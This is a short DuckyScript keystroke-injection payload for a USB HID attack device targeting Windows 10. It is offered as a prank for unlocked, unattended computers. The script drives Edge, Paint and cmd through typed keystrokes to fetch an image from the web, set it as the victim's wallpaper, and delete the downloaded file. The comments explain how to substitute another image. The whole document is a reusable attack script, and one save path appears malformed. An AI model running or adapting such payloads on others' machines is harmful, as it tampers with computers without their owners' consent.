# DuckyScript-Windows-ChangeWallpaper

REM DuckyScript-Windows-ChangeWallpaper
REM Author: dennis.n3dry
REM Duckencoder: 2.6.3
REM Target: Windows 10
REM Description: If the User forgets to lock their computer,this script will utilize Microsoft Edge to download
REM a wallpaper of Dennis Nedry from Jurrasic Park. It then sets the image as the curent wallpaper.
REM HOW TO USE OTHER IMAGE: Change the URL in the string on line 15, the filename on line 38, and the filename again on line 47. 

DEFAULTDELAY 250
DELAY 3000
GUI r
STRING microsoft-edge:https://i.ytimg.com/vi/K3PrSj9XEu4/maxresdefault.jpg
ENTER
DELAY 3000
GUI F11
DELAY 1500
PRINTSCREEN
ALT F4
GUI r
STRING mspaint
ENTER
DELAY 2000
CTRL v
ALT H
STRING RE
TAB
STRING 188
TAB
TAB
TAB
TAB
TAB
ENTER
CTRL s
STRING USERPROFILE\maxresdefault.jpg
ENTER
ALT F
STRING B
ENTER
ALT F4
GUI r
STRING cmd
ENTER
STRING Del maxresdefault.jpg
ENTER
ALT F4
GUI d
MENU
STRING r
